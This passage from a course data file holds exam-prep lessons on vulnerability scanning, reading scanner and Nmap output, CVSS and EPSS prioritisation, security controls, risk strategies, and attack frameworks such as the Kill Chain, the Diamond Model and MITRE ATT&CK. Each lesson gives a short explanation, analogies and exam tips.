          "Regulatory requirements: Standards decide how and how often to scan. PCI DSS requires internal and external scans at least quarterly, with external scans by an Approved Scanning Vendor. HIPAA requires regular risk analysis.",
        ],
        remember:
          "A building inspection. You do not inspect the hospital during surgery. Pick the right time (scheduling), avoid disturbing patients (operations and performance), treat the operating room differently from the lobby (sensitivity), inspect one wing at a time (segmentation), and follow the inspector's rulebook (regulations).",
        examTip:
          "Scan slows a production app = performance or operations: reschedule to off-hours or lower the intensity. Payment card data = PCI DSS. Patient data = HIPAA. Zones with different risk = segmentation (and a scanner in each zone). Always coordinate with the operations team before scanning fragile or critical systems such as OT.",
      },
      {
        heading: "Scan Types: Passive vs Active",
        explain:
          "Passive scanning only observes. Active scanning interacts with targets, so it finds more but carries more risk.",
        points: [
          "Passive scan: Monitors network traffic and system activity without sending probes. It is low risk but can only see what happens to pass by.",
          "Active scan: Sends probes and requests to targets to find vulnerabilities. It is more complete but can affect performance or stability.",
          "Passive examples: Sniffing or monitoring traffic, reviewing logs, passive asset discovery, and OSINT.",
          "Active examples: Port scanning, banner grabbing, service enumeration, and vulnerability probes.",
        ],
        remember:
          "Passive is a bird watcher with binoculars: you observe from a distance and never disturb anything. Active is a doctor checking reflexes: you touch the patient to get better answers, but you might cause a reaction.",
        examTip:
          "Fragile or business-critical system, or you cannot risk disruption = passive. Need the most complete and accurate results = active, ideally in a maintenance window. Probes sent, ports scanned, or banners grabbed = active (banner grabbing connects to the service). Only watching traffic = passive.",
      },
      {
        heading: "Scan Types: Internal vs External",
        explain:
          "Where the scanner sits decides what it can see. Each view finds different problems.",
        points: [
          "Internal scan: Run from inside the network to find issues an insider or an attacker who already got in could use, such as missing patches and weak configurations.",
          "External scan: Run from the internet to find what an outside attacker can see, such as exposed services and perimeter weaknesses.",
          "Use together: Both are needed for a full picture of exposure.",
        ],
        remember:
          "Checking a house. External = walking around outside to see which doors and windows a burglar could try. Internal = walking through the rooms to see what a burglar could reach once inside. You need both walks.",
        examTip:
          "Insider threat, an attacker who already got in, or lateral movement = internal scan. Internet-facing website, firewall, or perimeter exposure = external scan. 'What can the public internet see?' = external. PCI DSS needs both.",
      },
      {
        heading: "Scan Types: Agent vs Agentless",
        explain:
          "This describes HOW the scanner collects data: with software on the device, or from across the network.",
        points: [
          "Agent-based scan: A small program installed on each device collects detailed host information (installed software, local configuration, patch level) and reports back, even when the device is off the corporate network.",
          "Agentless scan: A central scanner assesses devices over the network without installing anything. It is easier to deploy but sees less detail.",
          "Common mix-up: Agentless scans can still be credentialed (using SSH, WMI, or SMB). 'Agent' and 'credentials' are different ideas.",
        ],
        remember:
          "An agent is a security guard stationed inside each building who sees everything and reports back, even when the building is off the main road. Agentless is a patrol car driving past and checking each building from the street. The guard sees more, but you must hire one for every building.",
        examTip:
          "Cannot install software (legacy, OT, locked-down devices) = agentless. Need deep host details, or remote laptops that are often off the network = agent-based. Fast deployment across many devices = agentless. Do not assume agentless means non-credentialed: they are separate questions.",
      },
      {
        heading: "Scan Types: Credentialed vs Non-Credentialed",
        explain:
          "This describes whether the scanner logs in to the target. Logging in reveals far more.",
        points: [
          "Credentialed scan: Uses a valid account to inspect the system from the inside: patch levels, installed software, configuration, and permissions. It gives more accurate results and fewer false positives.",
          "Non-credentialed scan: Has no login and sees only what an outside user could see, such as open ports and exposed services. It simulates an attacker with no access.",
          "Protect the scan account: use least privilege, a strong secret in a vault, and restrict where it can be used.",
        ],
        remember:
          "Non-credentialed is a stranger standing outside who can only see the front of the house. Credentialed is a home inspector with a key who can check the wiring, the attic, and the locks inside. The inspector finds far more problems.",
        examTip:
          "'What could an outside attacker see?' = non-credentialed. Missing patches, configuration problems, or too many false positives in results = switch to credentialed. A scanner account with domain admin rights is a risk, so use least privilege.",
      },
      {
        heading: "Discovery Scanning",
        explain:
          "Before checking for vulnerabilities, discover what exists on the network and what each thing is.",
        points: [
          "Discovery scan: Finds live hosts, services, and applications on a network. It is the first step and feeds the asset inventory.",
          "Mapping scans: Build a picture of devices and how they connect, showing topology and communication paths.",
          "Device fingerprinting: Identifies the operating system, software version, or device type from how it responds.",
        ],
        remember:
          "Exploring a new city. Discovery = finding out which buildings exist. Mapping = drawing the streets that connect them. Fingerprinting = reading the sign on each building to learn what it is (bank, school, warehouse). Do this before inspecting anything in detail.",
        examTip:
          "Which hosts and services are alive = discovery scan. Draw the network layout and connections = mapping scan. Identify the OS or device type from how it responds = device fingerprinting. Discovery comes first, then vulnerability scanning.",
      },
      {
        heading: "Security Baseline Scanning",
        explain:
          "A baseline scan checks whether systems match an approved secure standard.",
        points: [
          "Security baseline scanning: Compares system settings against a defined standard to find deviations (configuration drift).",
          "PCI DSS: Payment Card Industry Data Security Standard. Requirements for protecting cardholder data, including regular vulnerability scans.",
          "CIS Benchmarks: Center for Internet Security secure-configuration guides for operating systems, browsers, cloud platforms, and applications.",
          "ISO 27000 series: International standards for an information security management system. ISO 27001 is the certifiable standard.",
        ],
        remember:
          "A report card. The standard is the answer key, and the scan grades your systems against it. PCI DSS = the answer key for card payments. CIS Benchmarks = the answer key for hardening settings. ISO 27000 = the answer key for the whole security program.",
        examTip:
          "Credit card data = PCI DSS. Secure configuration settings for an OS or cloud platform = CIS Benchmarks. Company-wide security management system or certification = ISO 27001 (part of the ISO 27000 series). A system that has drifted away from approved settings = baseline deviation.",
      },
    ],
  },
  {
    id: "domain-2-2",
    title: "Analyzing Output from Vulnerability Assessment Tools",
    domain: "Domain 2.0",
    domainName: "Vulnerability Management",
    module: "2.2",
    moduleName: "Vulnerability Tool Output",
    description:
      "Network scanners, Nmap and other multipurpose tools, web application scanners, vulnerability scanners, cloud assessment tools, breach and attack simulation, and how to read scan output.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: AlertTriangle,
    estimatedTime: "90 minutes",
    sections: [
      {
        heading: "Network Scanning and Mapping",
        explain:
          "These tools find which devices are alive and which ports are open. That shows what is reachable, not what is wrong inside.",
        points: [
          "Angry IP Scanner: A fast, simple scanner that finds active hosts and open ports in an IP range.",
          "Masscan: A very high-speed port scanner that can scan huge ranges quickly.",
        ],
        remember:
          "Counting which lights are on in a huge apartment block. Angry IP Scanner = a quick walk past to see which windows are lit. Masscan = a helicopter flying over the whole city at once. Both tell you what is on, not what is wrong inside.",
        examTip:
          "Scan a huge range as fast as possible = Masscan. Simple, quick check of which hosts are alive in a range = Angry IP Scanner. Both show live hosts and open ports only; they do not replace a vulnerability scanner. Fast scans can overload fragile devices.",
      },
      {
        heading: "Multipurpose Tools",
        explain:
          "These tools combine discovery, reconnaissance, and exploitation in one toolkit.",
        points: [
          "Nmap: Discovers hosts, open ports, service versions, and operating systems, and can run scripts (NSE) for further checks.",
          "Metasploit Framework (MSF): A penetration testing framework that validates vulnerabilities by safely exploiting them. Practice targets such as Metasploitable are used in labs.",
          "Maltego: A link-analysis tool that draws relationships between people, domains, IPs, and organizations.",
          "Recon-ng: An open-source reconnaissance framework that automates OSINT collection.",
        ],
        remember:
          "A detective's kit. Nmap = the map and magnifying glass that shows hosts, ports, services, and operating systems. Metasploit = the lock-picking set that proves a door can really be opened. Maltego = the corkboard with red string. Recon-ng = the assistant who searches public sources for you.",
        examTip:
          "Hosts, open ports, service versions, and OS = Nmap. Prove a vulnerability is real by exploiting it = Metasploit (only with written authorization). Visual relationships between domains, IPs, and people = Maltego. Automated OSINT collection = Recon-ng.",
      },
      {
        heading: "Reading Nmap Output",
        explain:
          "The exam gives you scan output and asks what it means. Learn the common flags and the three port states.",
        points: [
          "Common flags: -sS (SYN scan), -sV (service versions), -O (OS detection), -sU (UDP scan), -Pn (skip host discovery, treat host as up), -p- (all 65535 ports), -A (aggressive: OS, version, scripts, traceroute).",
          "Open: A service is listening and accepting connections.",
          "Closed: The port is reachable, but nothing is listening.",
          "Filtered: A firewall or filter blocks the probe, so Nmap cannot tell whether the port is open.",
          "Risk reading: Unneeded open services (telnet, FTP, SMB exposed to the internet), old version numbers, and unexpected ports are the findings to report.",
        ],
        remember:
          "Knocking on doors. Open = someone answers. Closed = nobody home but the door is reachable. Filtered = a guard at the gate swallows your knock and says nothing. Version numbers tell you how old the lock is.",
        examTip:
          "'Filtered' means a firewall is in the way, not that the port is closed. Need to know what software and version is running = -sV. Host blocks ping and you still want to scan it = -Pn. Telnet (23) or FTP (21) open = insecure cleartext protocols. A version known to be vulnerable is a finding even if the scanner did not flag it.",
      },
      {
        heading: "Web Application Scanners",
        explain:
          "These tools test websites and web servers for flaws in the application code and in the server it runs on.",
        points: [
          "Burp Suite: A web testing platform with an intercepting proxy to inspect and modify requests, and scanners for SQL injection, XSS, and authentication weaknesses.",
          "Zed Attack Proxy (ZAP): A free, open-source web application scanner and intercepting proxy for automated and manual testing.",
          "Nikto: A web server scanner that finds dangerous files, outdated server software, and misconfigurations.",
        ],
        remember:
          "Three inspectors for a shop. Burp Suite = the professional who stands between you and the shop, reads and changes every message, and tests the checkout for tricks. ZAP = the same job done by a free community inspector. Nikto = the building inspector who checks the structure for dangerous leftovers and old parts.",
        examTip:
          "SQL injection, XSS, or intercepting and modifying web requests = Burp Suite or ZAP. Free and open-source web app scanner = ZAP. Outdated server software, default files, or web server misconfiguration = Nikto. Nikto checks the web SERVER; Burp and ZAP test the web APPLICATION.",
      },
      {
        heading: "Vulnerability Scanners",
        explain:
          "These tools compare systems with large databases of known flaws and report missing patches and weak settings.",
        points: [
          "Nessus: A widely used commercial vulnerability scanner for missing patches and misconfigurations. Findings are rated Critical, High, Medium, Low, and Info.",
          "Nuclei: A fast scanner that uses community-written templates, each checking for one specific known issue.",
          "Open Vulnerability Assessment Scanner (OpenVAS): A free, open-source vulnerability scanner.",
          "Reading results: Each finding has a severity, a CVE or plugin ID, the affected host and port, and a recommended fix. Validate important findings.",
        ],
        remember:
          "A doctor's checkup. Nessus = the well-known clinic that tests for many known conditions. OpenVAS = a free community clinic doing a similar checkup. Nuclei = a quick test strip: each template checks for exactly one known problem, so new tests can be added fast.",
        examTip:
          "Missing patches and configuration issues from a broad commercial scanner = Nessus. Free open-source scanner = OpenVAS. Quick scanning with community templates for a specific new flaw = Nuclei. An 'Info' finding is not a vulnerability. A scanner finding is a lead to verify, not proof, because false positives happen.",
      },
      {
        heading: "Cloud Infrastructure Assessment Tools",
        explain:
          "These tools check cloud accounts, containers, and Infrastructure as Code for risky settings, exposed secrets, and compliance gaps.",
        points: [
          "ScoutSuite: A multi-cloud auditing tool that reports risky configuration across providers.",
          "Prowler: Checks a cloud account against security best practices and compliance benchmarks (such as CIS).",
          "Trivy: Scans container images, Kubernetes, code repositories, and IaC for vulnerabilities, secrets, and misconfigurations.",
          "Checkov: Scans Infrastructure as Code (such as Terraform) for misconfigurations before deployment.",
        ],
        remember:
          "Building a house. Checkov = checking the blueprint before any bricks are laid. Trivy = inspecting the delivered materials (container images) for rot and hidden keys. ScoutSuite = a survey of the finished neighborhood across several cities. Prowler = a compliance inspector with a checklist.",
        examTip:
          "Audit more than one cloud provider = ScoutSuite. Check a cloud account against CIS or compliance benchmarks = Prowler. Scan container images or repos for vulnerabilities and exposed secrets = Trivy. Find misconfigurations in Terraform before deployment = Checkov ('shift left': fix it before it goes live).",
      },
      {
        heading: "Breach and Attack Simulation (BAS) Tools",
        explain:
          "BAS tools do not look for vulnerabilities. They test whether your defenses detect and stop real attacker techniques.",
        points: [
          "Atomic Red Team: A library of small, individual tests, each simulating one ATT&CK technique, to check that a detection or control works.",
          "Caldera: An automated adversary emulation platform that chains techniques into a realistic multi-step attack based on ATT&CK.",
        ],
        remember:
          "A fire drill. Atomic Red Team = lighting one small, safe flame to see if one smoke alarm goes off. Caldera = running a whole automated drill that acts out a realistic fire from start to finish. The point is to test whether your alarms and your team react.",
        examTip:
          "A small test of one technique to check a detection rule = Atomic Red Team. Automated, multi-step adversary emulation = Caldera. 'Does our SOC detect this technique?' = BAS, not a vulnerability scanner. Run BAS with approval and in a controlled way.",
      },
    ],
  },
  {
    id: "domain-2-3",
    title: "Analyzing Data to Prioritize and Mitigate Vulnerabilities",
    domain: "Domain 2.0",
    domainName: "Vulnerability Management",
    module: "2.3",
    moduleName: "Vulnerability Prioritization",
    description:
      "Prioritization criteria, true and false results, CVSS and EPSS scoring, context awareness, mitigation strategies, compensating controls, and validation of remediation.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: ListOrdered,
    estimatedTime: "90 minutes",
    sections: [
      {
        heading: "Prioritization Criteria",
        explain:
          "No team can fix everything at once. Analysts rank findings by how easily they can be exploited, whether attackers use them, and what is at stake.",
        points: [
          "Exploitability: How easily an attacker can use the flaw (remote, no login needed, public exploit code).",
          "Active exploitation and threat intelligence: Evidence that attackers are using the flaw now, such as inclusion in CISA's Known Exploited Vulnerabilities (KEV) catalog.",
          "Asset value: How important the system or data is to the business.",
          "Impact: How much damage a successful attack would cause.",
          "Patch and remediation availability: Whether a fix or workaround exists.",
        ],
        remember:
          "A hospital emergency room triages patients: how bad is it (impact), how fast is it getting worse (active exploitation), how easy is it to treat (exploitability), who is the patient (asset value), and is a treatment available (patch). Treat the most urgent first, not the first to arrive.",
        examTip:
          "Threat intel says a flaw is exploited right now = move it to the top. A medium-score flaw on a critical server with customer data can outrank a high-score flaw on a test machine. No patch available = use mitigations or compensating controls. Do not prioritize by CVSS alone.",
      },
      {
        heading: "True and False Results",
        explain:
          "Scanners are not perfect. Every result is right or wrong in one of four ways.",
        points: [
          "True positive: A real vulnerability is correctly reported.",
          "False positive: A vulnerability is reported but does not exist.",
          "True negative: No vulnerability exists and none is reported.",
          "False negative: A real vulnerability exists but the scanner missed it.",
        ],
        remember:
          "A smoke alarm. True positive = fire and the alarm rings. False positive = burnt toast and the alarm rings. True negative = no fire and no alarm. False negative = a real fire and the alarm stays silent. The silent alarm during a real fire is the dangerous one.",
        examTip:
          "Scanner reports a flaw that is not there = false positive (wastes time; validate manually). Scanner misses a real flaw = false negative, the most dangerous because nobody knows the risk exists. Fix false negatives with credentialed scans, updated plug-ins, and a second tool. Fix false positives by validating findings.",
      },
      {
        heading: "Scoring Methods: CVSS",
        explain:
          "CVSS turns the technical severity of a flaw into a number from 0 to 10 so flaws can be compared.",
        points: [
          "Common Vulnerability Scoring System (CVSS): A standard way to rate severity. Ratings: None 0.0, Low 0.1 to 3.9, Medium 4.0 to 6.9, High 7.0 to 8.9, Critical 9.0 to 10.0.",
          "Base metrics: Inherent qualities that do not change, such as Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), and the impact on Confidentiality, Integrity, and Availability (C, I, A).",
          "Temporal metrics: Factors that change over time, such as exploit code availability and patch status. CVSS 4.0 renames this group 'Threat'.",
          "Environmental metrics: Adjustments for your own environment, such as how important the asset is and what controls exist.",
        ],
        remember:
          "A storm warning. CVSS is how strong the storm is if it hits. Base = the storm's strength on paper. Temporal = how the forecast changes as time passes (exploit code appears, a patch is released). Environmental = how bad it is for your town specifically.",
        examTip:
          "Score that never changes and is the same everywhere = base. Changes as exploits appear or patches are released = temporal. Adjusted for your own systems and controls = environmental. AV:N (network) means exploitable remotely, which is worse than AV:L (local). PR:N means no login needed. Combine CVSS with threat intel and asset context rather than relying on one number.",
      },
      {
        heading: "Scoring Methods: EPSS",
        explain:
          "CVSS says how bad a flaw could be. EPSS says how likely it is to be attacked.",
        points: [
          "Exploit Prediction Scoring System (EPSS): A model that estimates the probability (0 to 1, or 0 to 100 percent) that a vulnerability will be exploited in the wild in the next 30 days.",
          "Using it with CVSS: A flaw with a high CVSS and a high EPSS is urgent. A high CVSS with a very low EPSS may wait behind more likely threats.",
          "Active exploitation: A flaw listed in CISA KEV is already being exploited, whatever its score.",
        ],
        remember:
          "A weather service reports two things: how strong the storm is (CVSS) and the chance it will hit your town this week (EPSS). A mild storm that is certain to hit can be more urgent than a huge storm that will almost surely miss.",
        examTip:
          "CVSS = how severe? EPSS = how likely to be exploited? A question asking which tool helps focus on flaws attackers are likely to exploit soon = EPSS. Known exploited = highest priority. Best practice combines CVSS, EPSS, asset value, and context.",
      },
      {
        heading: "Context Awareness",
        explain:
          "The same flaw can be a crisis on one system and a minor issue on another. Network location changes real risk.",
        points: [
          "Internal: Systems inside the network. An attacker usually needs internal access first.",
          "External: Internet-facing systems that anyone can reach directly.",
          "Isolated: Systems with little or no connectivity (air-gapped or tightly restricted), which are harder to reach.",
        ],
        remember:
          "A leaky window. On the street-facing front of the house (external), anyone walking by can use it. In an interior room (internal), a burglar must get into the house first. In a locked vault with no way in (isolated), it barely matters. Same flaw, very different urgency.",
        examTip:
          "Same CVSS score on an internet-facing web server and an isolated lab machine = fix the external one first. Isolation lowers priority but does not remove the vulnerability (removable media can still bring in an attack). A question that gives you network location is hinting that context decides the order.",
      },
      {
        heading: "Mitigation Strategies",
        explain:
          "After ranking, the team decides how to reduce risk. The best answer is a patch, but when that is impossible, other controls and formal decisions fill the gap.",
        points: [
          "Attack surface management: Continually finding and reducing exposed assets, ports, services, and accounts.",
          "Secure coding best practices: Input validation, parameterized queries, and secure design to prevent flaws in new code.",
          "Patching and configuration management: Applying updates and maintaining approved secure settings.",
          "Exceptions: A formally approved, documented, time-limited decision to accept a risk when remediation cannot be done now.",
          "Compensating controls: Alternative controls that reduce the risk when the main fix is impossible, such as network segmentation, firewall rules, MFA, extra monitoring, or access restrictions.",
        ],
        remember:
          "Protecting a village. Attack surface management = closing unused gates. Secure coding = building strong walls from the start. Patching = repairing known cracks. Exception = the mayor signing off that one crack stays for now. Compensating control = extra guards posted at the crack until it is repaired.",
        examTip:
          "Legacy system cannot be patched or a patch would break production = request a documented exception AND add compensating controls (segmentation, firewall rules, MFA, monitoring). An exception is valid only if it is approved, documented, and time-limited. Reducing exposed services and unused assets = attack surface management. Preventing injection in new code = secure coding.",
      },
      {
        heading: "Validation of Remediation",
        explain:
          "A fix is not finished until someone proves it worked.",
        points: [
          "Rescanning: Scan again after remediation to confirm the finding is gone.",
          "Verification testing: Test that the fix actually removes the weakness (for example, retry the exploit or check the configuration).",
          "Security monitoring: Keep watching so fixed issues do not return or get exploited meanwhile.",
        ],
        remember:
          "Fixing a leaking pipe. Rescanning = turning the water back on and looking for drips. Verification = pressure-testing the repair. Monitoring = checking again next week in case it leaks again. You do not say the pipe is fixed until you have tested it.",
        examTip:
          "Patch applied and ticket about to be closed = the next step is to rescan to confirm. Patch applied but the scanner still shows the flaw = investigate (failed install, reboot needed, wrong scan, or a false positive). Vulnerabilities that keep returning = review configuration management and add monitoring.",
      },
    ],
  },
  {
    id: "domain-2-4",
    title: "Control Types, Risk, and Vulnerability Management Concepts",
    domain: "Domain 2.0",
    domainName: "Vulnerability Management",
    module: "2.4",
    moduleName: "Controls, Risk, and Governance",
    description:
      "Control types and functions, risk concepts, risk management strategies, policies and governance, SLOs, application security testing, and third-party risk.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: ShieldCheck,
    estimatedTime: "100 minutes",
    sections: [
      {
        heading: "Control Types",
        explain:
          "Controls are grouped by how they are delivered: rules for people, technology, or the physical world.",
        points: [
          "Administrative controls: Policies, procedures, standards, and training that guide how people behave.",
          "Technical controls: Hardware or software protections such as firewalls, antivirus, encryption, IDS/IPS, and MFA.",
          "Physical controls: Measures that protect facilities and equipment, such as locks, fences, guards, cameras, and biometric door readers.",
        ],
        remember:
          "A school. Administrative = the rulebook and safety training for staff. Technical = the electronic gate and the software on the cameras. Physical = the fence, the locked doors, and the guard at the entrance. Rules for people, tools in technology, barriers in the real world.",
        examTip:
          "Policy, procedure, standard, or training = administrative. Firewall, encryption, MFA, or IDS = technical. Lock, fence, guard, camera, or badge reader = physical. Questions give an example and ask for the type, so match the example first.",
      },
      {
        heading: "Control Functions",
        explain:
          "Controls are also grouped by what they do around an incident: stop it, spot it, react to it, or repair the damage.",
        points: [
          "Preventative: Stops an incident before it happens. Examples: firewall rules, MFA, access control, security training, routine patching.",
          "Detective: Finds and alerts on suspicious activity. Examples: SIEM, IDS, log monitoring, audits, cameras.",
          "Responsive: Acts during or right after an event to contain it. Examples: isolating a host, blocking an IP through SOAR, disabling a compromised account, running the incident response plan.",
          "Corrective: Restores systems and fixes the cause after an incident. Examples: restoring from backup, patching the exploited flaw, rebuilding a system, disaster recovery.",
        ],
        remember:
          "A house fire. Preventative = fireproof wiring and not leaving the stove on. Detective = the smoke alarm. Responsive = the sprinklers and the fire brigade putting it out. Corrective = rebuilding the kitchen and fixing the faulty wire.",
        examTip:
          "Stops it before it happens = preventative. Alerts or logs after something suspicious happens = detective. Contains or limits damage as it happens = responsive. Restores or fixes the root cause afterward = corrective. Patching in advance is preventative, but patching the exploited hole after a breach is corrective. Read what the control is DOING in the scenario.",
      },
      {
        heading: "Risk Concepts",
        explain:
          "Risk never reaches zero. These terms describe the risk before controls, after controls, and how much leadership will tolerate.",
        points: [
          "Inherent risk: The risk that exists before any controls are applied.",
          "Residual risk: The risk that remains after controls are applied.",
          "Risk appetite: The amount of risk the organization is willing to accept to pursue its goals.",
          "Flow: Inherent risk, then controls applied, then residual risk, which is compared with risk appetite.",
        ],
        remember:
          "Driving. Inherent risk = the danger of driving with no seatbelt, no airbags, and no rules. Controls = seatbelt, airbags, and speed limits. Residual risk = the danger that is still there. Risk appetite = how much danger you will accept to get to work on time.",
        examTip:
          "Risk before any controls = inherent. Risk left after controls = residual. If residual risk is higher than the risk appetite, add controls or pick another strategy. Residual risk is never zero. 'How much risk leadership will tolerate' = risk appetite.",
      },
      {
        heading: "Risk Management Strategies",
        explain:
          "When a risk is identified, an organization has four basic choices.",
        points: [
          "Accept: Knowingly live with the risk because the impact or likelihood is low or the cost of control is too high. It should be documented and approved.",
          "Transfer: Shift the financial impact to another party, for example by buying cyber insurance or outsourcing.",
          "Avoid: Stop the activity that creates the risk, for example by shutting down an insecure service.",
          "Mitigate: Reduce likelihood or impact with controls such as patching, MFA, or segmentation.",
        ],
        remember:
          "A rainy day. Accept = go out and get wet because it is only a drizzle. Transfer = take a taxi so the weather becomes the driver's problem (insurance). Avoid = stay home. Mitigate = take an umbrella and wear a raincoat.",
        examTip:
          "Insurance or outsourcing = transfer. Shutting down a risky service or dropping the activity = avoid. Patching, MFA, or segmentation = mitigate. Leadership signs off to live with it = accept. Insurance moves the cost but does not remove the risk itself.",
      },
      {
        heading: "Policies, Governance, SLOs, and SLAs",
        explain:
          "Written rules, oversight, and measurable targets keep security work consistent and aligned with the business.",
        points: [
          "Policies: Formal documents stating requirements and expected behavior.",
          "Governance: The framework for directing, overseeing, and checking security activities so they meet business goals and compliance requirements.",
          "Service-level objective (SLO): A measurable internal target, such as patch critical flaws within 7 days or 99.9 percent uptime.",
          "Service-level agreement (SLA): An agreement, often with a customer or vendor, that sets the expected service and often the consequences if it is missed. SLOs are the targets that support an SLA.",
        ],
        remember:
          "A football league. Policy = the rulebook. Governance = the officials who make sure every team follows the rules. SLO = the target on the coach's whiteboard (win 9 of 10). SLA = the signed contract that says what happens if you do not.",
        examTip:
          "Formal document of what is and is not allowed = policy. Oversight, compliance, and alignment with business goals = governance. A number you can measure internally = SLO. An agreement with consequences, often with a vendor or customer = SLA. A remediation deadline by severity is a classic SLO example.",
      },
      {
        heading: "Application Security",
        explain:
          "Application security testing finds weaknesses in software, either by reading the code or by attacking the running program.",
        points: [
          "Static Application Security Testing (SAST): Analyzes source code, bytecode, or binaries without running the program. It finds issues early and can point to the line of code, but can give false positives.",
          "Dynamic Application Security Testing (DAST): Tests a running application from the outside, with no source code, like an attacker would. It finds runtime issues but cannot point to the exact line.",
          "Software Assurance Maturity Model (SAMM): A framework from OWASP for measuring and improving how mature an organization's software security practices are.",
        ],
        remember:
          "Checking a car. SAST = reading the blueprints and engine design before the car is built, looking for mistakes. DAST = taking the finished car on a test drive and trying to make it fail. SAMM = the grading chart that shows how mature the whole car factory is at building safe cars.",
        examTip:
          "Has source code and the app is not running = SAST (shift left, early in the SDLC). Testing a live app from outside with no code = DAST. Measuring how mature the development security program is = SAMM. Use both SAST and DAST because they find different problems.",
      },
      {
        heading: "Third-Party Risk",
        explain:
          "Your software and hardware come from many sources. Weaknesses in suppliers and components enter your environment even when your own work is secure.",
        points: [
          "Supply chain risk: Threats introduced through vendors, suppliers, service providers, software updates, or hardware.",
          "Software Composition Analysis (SCA): Identifies third-party and open-source components in an application and checks them for known vulnerabilities and license issues.",
          "Software Bill of Materials (SBOM): A detailed inventory of all components, libraries, and versions in an application.",
        ],
        remember:
          "A packaged meal. The SBOM is the ingredients label that lists everything inside. SCA is the lab test that checks each ingredient for contamination. Supply chain risk is the farm that grew a bad ingredient: you did not grow it, but it is still in your meal.",
        examTip:
          "A list of every library and version in an application = SBOM. Scanning those components for known flaws and license problems = SCA. A new flaw like Log4j appears and you must find which apps use it = check the SBOM. A compromised vendor update or tampered component = supply chain attack.",
      },
    ],
  },
  // ===================== DOMAIN 3.0 INCIDENT RESPONSE AND MANAGEMENT (24%) =====================
  {
    id: "domain-3-1",
    title: "Attack Methodologies and Frameworks",
    domain: "Domain 3.0",
    domainName: "Incident Response and Management",
    module: "3.1",
    moduleName: "Attack Methodology Frameworks",
    description:
      "The Cyber Kill Chain, the Diamond Model of Intrusion Analysis, and the MITRE ATT&CK framework, and when to use each.",
    lastUpdated: "2026-10-19",
    access: "Free",
    icon: Brain,
    estimatedTime: "75 minutes",
    sections: [
      {
        heading: "Cyber Kill Chain",
        explain:
          "The Lockheed Martin Cyber Kill Chain breaks an attack into 7 linear phases. If defenders break the chain at any phase, the attack fails.",
        points: [
          "Reconnaissance: The attacker gathers information about the target, such as employees, email addresses, and exposed systems.",
          "Weaponization: The attacker builds or prepares the malicious payload, such as a malware-laden document.",
          "Delivery: The payload is sent to the target through email, a website, USB, or another channel.",
          "Exploitation: A vulnerability or user action triggers the attacker's code to run.",
          "Installation: Malware or a backdoor is installed to keep access.",
          "Command and Control (C2): The compromised system connects to the attacker's server so it can be controlled remotely.",
          "Actions on Objectives: The attacker reaches the goal, such as stealing data, encrypting files, or disrupting services.",
        ],
        remember:
          "Order: Recon, Weaponize, Deliver, Exploit, Install, C2, Actions. A burglary: case the house, build the tools, get the tools to the door, break in, hide a key under the mat, phone the boss, take the goods. Stop the burglar at any step and the burglary fails.",
        examTip:
          "Match the scenario to the phase. Phishing email sent = Delivery. Code runs after the user opens the attachment = Exploitation. A backdoor or scheduled task is planted = Installation. Regular beaconing to an external server = C2. Data copied out = Actions on Objectives. The kill chain is linear and focused on the perimeter, while ATT&CK is not a strict sequence.",
      },
      {
        heading: "Diamond Model of Intrusion Analysis",
        explain:
          "The Diamond Model describes every intrusion event with four connected features. Analysts pivot between them to learn more about an attack.",
        points: [
          "Adversary: The person, group, or organization behind the attack.",
          "Capability: The tools, malware, and exploits the adversary uses.",
          "Infrastructure: The resources used to reach the victim, such as IP addresses, domains, and C2 servers.",
          "Victim: The target: a person, organization, system, or data.",
          "Pivoting: Moving from one feature to another to find more. For example, a known C2 domain (infrastructure) can lead to the adversary and to other victims.",
          "Meta-features: Extra context for each event, such as timestamp, phase, result, direction, methodology, and resources.",
        ],
        remember:
          "A diamond with four corners: Adversary, Capability, Infrastructure, Victim. It is a detective's pin board. Find the getaway car (infrastructure) and you can trace who drives it (adversary) and which other houses it visited (victims).",
        examTip:
          "Capability = tools (malware, exploits). Infrastructure = what the attacker uses to reach the victim (IPs, domains, C2). A question about relating adversary, victim, tools, and infrastructure to support attribution or pivoting = Diamond Model. The Diamond Model describes an event; the Kill Chain describes the steps over time.",
      },
      {
        heading: "MITRE ATT&CK",
        explain:
          "ATT&CK is a public knowledge base of real attacker behavior, organized as tactics (goals) and techniques (methods). It is the common language of detection and hunting.",
        points: [
          "Reconnaissance: Gathering information about the target before the attack.",
          "Resource Development: Building or buying infrastructure, accounts, and tools.",
          "Initial Access: Getting into the environment (for example phishing, exploiting a public app).",
          "Execution: Running malicious code.",
          "Persistence: Keeping access across restarts and credential changes.",
          "Privilege Escalation: Gaining higher permissions.",
          "Defense Evasion: Avoiding detection (disabling security tools, clearing logs).",
          "Credential Access: Stealing usernames, passwords, and tokens.",
          "Discovery: Learning about systems, users, and the network.",
          "Lateral Movement: Moving from one system to another.",
          "Collection: Gathering the data of interest.",
          "Command and Control: Communicating with compromised systems.",
          "Exfiltration: Stealing data out of the environment.",
          "Impact: Disrupting, destroying, or manipulating systems and data (for example ransomware encryption or data wiping).",
          "Sub-techniques: More specific versions of a technique. The ATT&CK Navigator can color techniques to build a heat map of coverage.",
        ],
        remember:
          "Fourteen tactics: attackers must get in (Recon to Initial Access), run and stay (Execution, Persistence), grow and hide (Privilege Escalation, Defense Evasion), explore and move (Credential Access, Discovery, Lateral Movement), take (Collection, C2, Exfiltration), and cause damage (Impact). Tactic = why, technique = how, procedure = how one group does it.",
        examTip:
          "Tactic is the goal (Persistence). Technique is the method (Scheduled Task). Procedure is how a specific group does it. ATT&CK is not a strict sequence: attackers can skip or repeat tactics. Use it for threat hunting, detection gap analysis, and red or purple team planning. 'Ransomware encrypts files' maps to Impact; 'dumping passwords from memory' maps to Credential Access.",
      },
      {
        heading: "Choosing the Right Framework",
        explain:
          "The exam often asks which framework fits a situation. The three models answer different questions.",
        points: [
          "Cyber Kill Chain: Linear, 7 phases. Best for understanding the stages of an attack and where to interrupt it.",
          "Diamond Model: Four features of an intrusion event. Best for analysis, relationships, pivoting, and attribution.",
          "MITRE ATT&CK: Detailed, non-linear matrix of tactics and techniques. Best for detection engineering, hunting, and mapping behavior.",
        ],
        remember:
          "Kill Chain = the story from start to finish. Diamond = the relationships between the people and things involved. ATT&CK = the encyclopedia of attacker moves.",
        examTip:
